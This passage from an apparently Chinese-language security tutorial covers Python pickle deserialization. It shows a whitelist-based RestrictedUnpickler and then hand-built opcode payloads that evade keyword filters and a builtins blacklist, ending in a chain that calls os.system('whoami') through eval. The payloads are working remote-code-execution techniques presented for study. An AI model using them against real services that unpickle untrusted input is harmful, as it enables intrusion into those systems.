如果被反序列化的对象的类属于builtins模块中的安全类，则返回该类</span><br>        <span class="hljs-keyword">if</span> module == <span class="hljs-string">&quot;builtins&quot;</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">in</span> safe_builtins:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(builtins, name)<br>        <span class="hljs-comment"># 如果不是安全类，就抛出异常，禁止反序列化</span><br>        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %<br>                                     (module, name))<br><br><span class="hljs-comment"># 定义一个帮助函数restricted_loads来反序列化对象</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">restricted_loads</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-comment"># 将传入的字符串s转换为bytes，并使用RestrictedUnpickler类反序列化</span><br>    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()<br><br>opcode=<span class="hljs-string">b&quot;cos\nsystem\n(S&#x27;echo hello world&#x27;\ntR.&quot;</span><br>restricted_loads(opcode)<br><br><br><span class="hljs-comment">###结果如下</span><br>Traceback (most recent call last):<br>...<br>_pickle.UnpicklingError: <span class="hljs-keyword">global</span> <span class="hljs-string">&#x27;os.system&#x27;</span> <span class="hljs-keyword">is</span> forbidden<br></code></pre></td></tr></table></figure><p>以上例子通过重写Unpickler.find_class()方法，限制调用模块只能为builtins，且函数必须在白名单内，否则抛出异常。</p><h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><h2 id="关键字绕过"><a href="#关键字绕过" class="headerlink" title="关键字绕过"></a>关键字绕过</h2><blockquote><p>利用opcode进行变量覆盖时，代码中可能会过滤了我们想要覆盖的属性关键字</p></blockquote><p>例如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">import</span> secret<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;变量的值为:&quot;</span> + secret.key)<br><br><span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;key&#x27;</span> <span class="hljs-keyword">in</span> opcode:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;NoNoNo&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    pickle.loads(opcode)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;变量的值为:&quot;</span> + <span class="hljs-built_in">str</span>(secret.key))<br></code></pre></td></tr></table></figure><p>正常的opcode应该是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">opcode = <span class="hljs-string">b&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(S&#x27;key&#x27;</span><br><span class="hljs-string">S&#x27;123&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>方法一：十六进制</strong></p><p>因为 S 操作符是可以识别十六进制的，所以这里也可以对字符进行十六进制编码来绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># S&#x27;key&#x27; = S&#x27;\x6B\x65\x79&#x27;</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">import</span> secret<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;变量的值为:&quot;</span> + secret.key)<br><br>opcode = <span class="hljs-string">b&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(S&#x27;\\x6B\\x65\\x79&#x27;</span><br><span class="hljs-string">S&#x27;111&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;key&#x27;</span> <span class="hljs-keyword">in</span> opcode:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;NoNoNo&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    pickle.loads(opcode)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;变量的值为:&quot;</span> + <span class="hljs-built_in">str</span>(secret.key))<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">变量的值为:123</span><br><span class="hljs-string">变量的值为:111</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>方法二：unicode编码</strong></p><p>同样的，V 操作符也可以识别unicode编码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># S&#x27;key&#x27; = V\u006b\u0065\u0079</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">import</span> secret<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;变量的值为:&quot;</span> + secret.key)<br><br>opcode = <span class="hljs-string">b&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(V\u006b\u0065\u0079</span><br><span class="hljs-string">S&#x27;111111&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;key&#x27;</span> <span class="hljs-keyword">in</span> opcode:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;NoNoNo&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    pickle.loads(opcode)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;变量的值为:&quot;</span> + <span class="hljs-built_in">str</span>(secret.key))<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">变量的值为:123</span><br><span class="hljs-string">变量的值为:111111</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>方法三：利用内置函数获取关键字</strong></p><p>在python中，当我们导入某个模块后，可以通过<code>dir(sys.modules[&#39;xxx&#39;])</code>来获取其全部属性</p><p>例如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> secret<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">dir</span>(sys.modules[<span class="hljs-string">&#x27;secret&#x27;</span>]))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[&#x27;__builtins__&#x27;, &#x27;__cached__&#x27;, &#x27;__doc__&#x27;, &#x27;__file__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__spec__&#x27;, &#x27;key&#x27;]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>但是因为pickle不持支列表索引和字典索引，所以需要用<code>reversed()+next()</code>来获取元素</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> secret<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(<span class="hljs-built_in">reversed</span>(<span class="hljs-built_in">dir</span>(sys.modules[<span class="hljs-string">&#x27;secret&#x27;</span>]))))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">key</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>转换成opcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 构造出dir</span><br>opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;(c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">dir</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 构造reversed</span><br>opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;((c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">dir</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">reversed</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 构造next</span><br>opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;(((c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">dir</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">reversed</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">next</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 变量覆盖</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">import</span> secret<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;变量的值为:&quot;</span> + secret.key)<br><br>opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">((((c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">dir</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">reversed</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">next</span><br><span class="hljs-string">S&#x27;111&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;key&#x27;</span> <span class="hljs-keyword">in</span> opcode:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;NoNoNo&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    pickle.loads(opcode)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;变量的值为:&quot;</span> + <span class="hljs-built_in">str</span>(secret.key))<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">变量的值为:123</span><br><span class="hljs-string">变量的值为:111</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="绕过builtins"><a href="#绕过builtins" class="headerlink" title="绕过builtins"></a>绕过builtins</h2><p>对于<a href="#b">上文</a>提到的重写find_class()方法来限制调用模块，如果采用的是黑名单的方式，那么就有可能绕过其限制</p><p>例如<a href="https://github.com/phith0n/code-breaking/tree/master/2018/picklecode">code-breaking 2018 picklecode</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> builtins<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br>    blacklist = &#123;<span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;execfile&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;input&#x27;</span>, <span class="hljs-string">&#x27;__import__&#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>&#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-comment"># Only allow safe classes from builtins.</span><br>        <span class="hljs-keyword">if</span> module == <span class="hljs-string">&quot;builtins&quot;</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.blacklist:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(builtins, name)<br>        <span class="hljs-comment"># Forbid everything else.</span><br>        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %<br>                                     (module, name))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">restricted_loads</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()<br></code></pre></td></tr></table></figure><p>同样是限制了使用的模块只能为builtins，加上一个黑名单。但是我们可以利用<code>getattr</code>来获取一些黑名单函数，例如<code>builtins.getattr(&#39;builtins&#39;, &#39;eval&#39;)</code></p><p>转换成payload：<code>builtins.getattr(builtins, &#39;eval&#39;),(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,)</code></p><p>然后开始手搓opcode</p><p>首先调用builtins.getattr</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">cbuiltins<br><span class="hljs-built_in">getattr</span><br></code></pre></td></tr></table></figure><p>然后注意不能直接压入builtins，需要构造出一个builtins模块再来传给getattr</p><p>例如可以从<code>builtins.globals()</code>中拿到builtins模块，但是因为返回值是<code>&lt;class &#39;dict&#39;&gt;</code>，所以还需要一个<code>builtins.dict</code>中的get函数来取出<code>builtins</code></p><p>变换后的payload：<code>builtins.getattr(builtins.getattr(builtins.dict,&#39;get&#39;)(builtins.globals(),&#39;builtins&#39;),&#39;eval&#39;)(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,)</code></p><p>继续编写opcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#构造出get函数</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><br>opcode = <span class="hljs-string">b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">dict</span><br><span class="hljs-string">S&#x27;get&#x27;</span><br><span class="hljs-string">tR.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>pickletools.dis(opcode)<br><span class="hljs-built_in">print</span>(pickle.loads(opcode))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    0: c    GLOBAL     &#x27;builtins getattr&#x27;</span><br><span class="hljs-string">   18: (    MARK</span><br><span class="hljs-string">   19: c        GLOBAL     &#x27;builtins dict&#x27;</span><br><span class="hljs-string">   34: S        STRING     &#x27;get&#x27;</span><br><span class="hljs-string">   41: t        TUPLE      (MARK at 18)</span><br><span class="hljs-string">   42: R    REDUCE</span><br><span class="hljs-string">   43: .    STOP</span><br><span class="hljs-string">highest protocol among opcodes = 0</span><br><span class="hljs-string">&lt;method &#x27;get&#x27; of &#x27;dict&#x27; objects&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 获取globals()字典</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><br>opcode = <span class="hljs-string">b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">globals</span><br><span class="hljs-string">)R.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>pickletools.dis(opcode)<br><span class="hljs-built_in">print</span>(pickle.loads(opcode))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    0: c    GLOBAL     &#x27;builtins globals&#x27;</span><br><span class="hljs-string">   18: )    EMPTY_TUPLE</span><br><span class="hljs-string">   19: R    REDUCE</span><br><span class="hljs-string">   20: .    STOP</span><br><span class="hljs-string">highest protocol among opcodes = 1</span><br><span class="hljs-string">&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x000002490202C9D0&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;__file__&#x27;: &#x27;C:\\Users\\lewiserii\\Desktop\\test\\2.py&#x27;, &#x27;__cached__&#x27;: None, &#x27;pickle&#x27;: &lt;module &#x27;pickle&#x27; from &#x27;C:\\Python\\Python311\\Lib\\pickle.py&#x27;&gt;, &#x27;pickletools&#x27;: &lt;module &#x27;pickletools&#x27; from &#x27;C:\\Python\\Python311\\Lib\\pickletools.py&#x27;&gt;, &#x27;opcode&#x27;: b&#x27;cbuiltins\nglobals\n)R.\n&#x27;&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 组合get()和globals()字典，获取builtins模块</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><br>opcode = <span class="hljs-string">b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">dict</span><br><span class="hljs-string">S&#x27;get&#x27;</span><br><span class="hljs-string">tR(cbuiltins</span><br><span class="hljs-string">globals</span><br><span class="hljs-string">)RS&#x27;__builtins__&#x27;</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br><br>pickletools.dis(opcode)<br><span class="hljs-built_in">print</span>(pickle.loads(opcode))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    0: c    GLOBAL     &#x27;builtins getattr&#x27;</span><br><span class="hljs-string">   18: (    MARK</span><br><span class="hljs-string">   19: c        GLOBAL     &#x27;builtins dict&#x27;</span><br><span class="hljs-string">   34: S        STRING     &#x27;get&#x27;</span><br><span class="hljs-string">   41: t        TUPLE      (MARK at 18)</span><br><span class="hljs-string">   42: R    REDUCE</span><br><span class="hljs-string">   43: (    MARK</span><br><span class="hljs-string">   44: c        GLOBAL     &#x27;builtins globals&#x27;</span><br><span class="hljs-string">   62: )        EMPTY_TUPLE</span><br><span class="hljs-string">   63: R        REDUCE</span><br><span class="hljs-string">   64: S        STRING     &#x27;__builtins__&#x27;</span><br><span class="hljs-string">   80: t        TUPLE      (MARK at 43)</span><br><span class="hljs-string">   81: R    REDUCE</span><br><span class="hljs-string">   82: .    STOP</span><br><span class="hljs-string">highest protocol among opcodes = 1</span><br><span class="hljs-string">&lt;module &#x27;builtins&#x27; (built-in)&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 获取eval</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><br>opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">dict</span><br><span class="hljs-string">S&#x27;get&#x27;</span><br><span class="hljs-string">tR(cbuiltins</span><br><span class="hljs-string">globals</span><br><span class="hljs-string">)RS&#x27;__builtins__&#x27;</span><br><span class="hljs-string">tRS&#x27;eval&#x27;</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br><br>pickletools.dis(opcode)<br><span class="hljs-built_in">print</span>(pickle.loads(opcode))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    0: c    GLOBAL     &#x27;builtins getattr&#x27;</span><br><span class="hljs-string">   18: (    MARK</span><br><span class="hljs-string">   19: c        GLOBAL     &#x27;builtins getattr&#x27;</span><br><span class="hljs-string">   37: (        MARK</span><br><span class="hljs-string">   38: c            GLOBAL     &#x27;builtins dict&#x27;</span><br><span class="hljs-string">   53: S            STRING     &#x27;get&#x27;</span><br><span class="hljs-string">   60: t            TUPLE      (MARK at 37)</span><br><span class="hljs-string">   61: R        REDUCE</span><br><span class="hljs-string">   62: (        MARK</span><br><span class="hljs-string">   63: c            GLOBAL     &#x27;builtins globals&#x27;</span><br><span class="hljs-string">   81: )            EMPTY_TUPLE</span><br><span class="hljs-string">   82: R            REDUCE</span><br><span class="hljs-string">   83: S            STRING     &#x27;__builtins__&#x27;</span><br><span class="hljs-string">   99: t            TUPLE      (MARK at 62)</span><br><span class="hljs-string">  100: R        REDUCE</span><br><span class="hljs-string">  101: S        STRING     &#x27;eval&#x27;</span><br><span class="hljs-string">  109: t        TUPLE      (MARK at 18)</span><br><span class="hljs-string">  110: R    REDUCE</span><br><span class="hljs-string">  111: .    STOP</span><br><span class="hljs-string">highest protocol among opcodes = 1</span><br><span class="hljs-string">&lt;built-in function eval&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 执行命令</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><br>opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">dict</span><br><span class="hljs-string">S&#x27;get&#x27;</span><br><span class="hljs-string">tR(cbuiltins</span><br><span class="hljs-string">globals</span><br><span class="hljs-string">)RS&#x27;__builtins__&#x27;</span><br><span class="hljs-string">tRS&#x27;eval&#x27;</span><br><span class="hljs-string">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span><br><span class="hljs-string">tR.</span><br><span 